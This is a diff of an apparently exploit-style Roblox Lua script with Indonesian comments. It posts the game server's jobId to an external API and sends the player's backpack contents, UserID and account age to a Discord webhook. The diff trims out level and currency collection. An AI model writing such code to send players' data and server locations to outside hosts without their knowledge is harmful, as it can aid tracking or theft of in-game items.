@@ -45,31 +45,6 @@ local function getBackpackContents()
     end
 end
 
--- Fungsi untuk mendapatkan data player dengan error handling
-local function getPlayerData()
-    local data = {}
-    
-    -- Coba dapatkan level
-    pcall(function()
-        data.level = player:FindFirstChild("Level") and player.Level.Value or "Tidak tersedia"
-    end)
-    
-    -- Coba dapatkan currency
-    pcall(function()
-        if player:FindFirstChild("Data") and player.Data:FindFirstChild("Currency") then
-            data.currency = player.Data.Currency.Value
-        else
-            data.currency = "Tidak tersedia"
-        end
-    end)
-    
-    -- Tambahkan data dasar
-    data.userId = player.UserId
-    data.accountAge = player.AccountAge
-    
-    return data
-end
-
 -- Kirim ke API
 local jsonData = HttpService:JSONEncode({ instanceId = jobId })
 local apiResponse = safeRequest({
@@ -87,18 +62,8 @@ else
     warn("❌ Gagal kirim ke API:", apiResponse and apiResponse.StatusCode or "Tidak ada respons")
 end
 
--- Dapatkan data player dan backpack
+-- Dapatkan isi backpack
 local backpackContents = getBackpackContents()
-local playerData = getPlayerData()
-
--- Format data player untuk webhook
-local playerInfo = string.format(
-    "UserID: %d\nAccount Age: %d hari\nLevel: %s\nCurrency: %s",
-    playerData.userId,
-    playerData.accountAge,
-    playerData.level,
-    playerData.currency
-)
 
 -- Kirim ke Discord Webhook
 local embed = {
@@ -115,8 +80,8 @@ local embed = {
                 ["inline"] = false
             },
             {
-                ["name"] = "👤 Data Player",
-                ["value"] = playerInfo,
+                ["name"] = "👤 Info Player",
+                ["value"] = string.format("UserID: %d\nAccount Age: %d hari", player.UserId, player.AccountAge),
                 ["inline"] = true
             }
         },
